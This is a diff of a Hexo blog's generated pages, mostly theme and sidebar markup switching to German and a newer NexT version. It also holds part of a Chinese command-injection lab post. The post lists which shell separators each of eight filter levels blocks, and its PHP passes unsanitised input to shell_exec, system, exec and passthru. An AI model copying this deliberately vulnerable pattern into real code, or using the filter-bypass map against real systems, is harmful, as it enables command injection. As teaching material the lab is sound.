+安全等级1没有任何过滤&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级2过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级3过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级4过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;;&amp;nbsp;&amp;&amp;&amp;nbsp;||&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级5代码书写失误，过滤无效&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级6过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;;&amp;nbsp;&amp;&amp;&amp;nbsp;||`&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级7过滤了&amp;nbsp;&amp;&amp;nbsp;|&amp;nbsp;;&amp;nbsp;&amp;&amp;&amp;nbsp;||&amp;nbsp;`&amp;nbsp;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;安全等级8使用了php的内建函数，在#&amp;nbsp;&amp;&amp;nbsp;;&amp;nbsp;`&amp;nbsp;|&amp;nbsp;*&amp;nbsp;?&amp;nbsp;~&amp;nbsp;&lt;&amp;nbsp;&gt;&amp;nbsp;^&amp;nbsp;(&amp;nbsp;)&amp;nbsp;[&amp;nbsp;]&amp;nbsp;{&amp;nbsp;}&amp;nbsp;$&amp;nbsp;\&amp;nbsp;\x0A&amp;nbsp;\xFF之前加了转移字符&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
+&lt;/span&gt;&apos;);
+    }
+
+    $result = shell_exec($servercmd . &apos; &apos; . $cmds);
+    echo &apos;shell_exec output: &lt;br&gt;&apos;;
+    echo $result;
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;
+
+    echo &apos;----------------------------------------------------------&lt;br&gt;&apos;;
+
+    echo &apos;system output: &lt;br&gt;&apos;;
+    system($servercmd . &apos; &apos; . $cmds, $code);
+
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;system return code: &apos;;
+    echo $code;
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;
+
+    echo &apos;----------------------------------------------------------&lt;br&gt;&apos;;
+
+    exec($servercmd . &apos; &apos; . $cmds, $a, $code2);
+    echo &apos;exec output:&lt;br&gt;&apos;;
+
+    foreach ($a as $aa) {
+    echo $aa;
+    }
+
+
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;exec return code:&apos; . $code2;
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;
+
+    echo &apos;----------------------------------------------------------&lt;br&gt;&apos;;
+
+    echo &apos;passthru output:&lt;br&gt;&apos;;
+    passthru($servercmd . &apos; &apos; . $cmds, $code3);
+
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;passthru return code: &apos;;
+    echo $code3;
+    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;
+
+    echo &apos;----------------------------------------------------------&lt;br&gt;&apos;;
+
+    echo &quot;the string is:&lt;br&gt;&quot; . $cmds;
+
+    ?&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
         
       
     </div>
-    
-    
-    
-    <div>
-      
-    </div>
-    
 
     
-
     
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
   </div>
   
   
   
   </article>
 
-
     
-  </section>
+  </div>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Nächste Seite"></i></a>
   </nav>
-
 
 
           </div>
           
 
-
-          
-
         </div>
-        
           
   
   <div class="sidebar-toggle">
@@ -1801,112 +2307,96 @@ shell_exec
     </div>
   </div>
 
-  <aside id="sidebar" class="sidebar">
-    
+  <aside class="sidebar">
     <div class="sidebar-inner">
 
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">hl0rey</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
       
-
       
-
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">hl0rey</p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/">
-              
-                  <span class="site-state-item-count">31</span>
-                  <span class="site-state-item-name">日志</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
-                  <span class="site-state-item-name">分类</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">14</span>
-                  <span class="site-state-item-name">标签</span>
-                </a>
-              </div>
-            
-
-          </nav>
-
+      <div class="site-state-item site-state-categories">
+        
           
-
+            <a href="/categories/">
           
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
+        
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">Kategorien</span>
+        </a>
+      </div>
+    
       
-
       
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">schlagwörter</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
 
     </div>
   </aside>
+  <div id="sidebar-dimmer"></div>
 
 
-        
       </div>
     </main>
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
         <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
-  <span class="with-love">
+  <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">hl0rey</span>
-
-  
 </div>
-
-
-  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
-
-
-
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.5.0</div>
   <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
-
-
-
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.0</div>
 
         
+
+
+
+
+
 
 
 
@@ -1917,123 +2407,17 @@ shell_exec
         
       </div>
     </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
   </div>
 
   
 
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
 
-
-
-
-
-
-
-
-
-  
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-  
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/muse.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
 
 
 
@@ -2050,20 +2434,14 @@ shell_exec
 
 
 
-  
 
 
 
 
 
-  
 
-  
 
-  
 
-  
-  
 
   
 
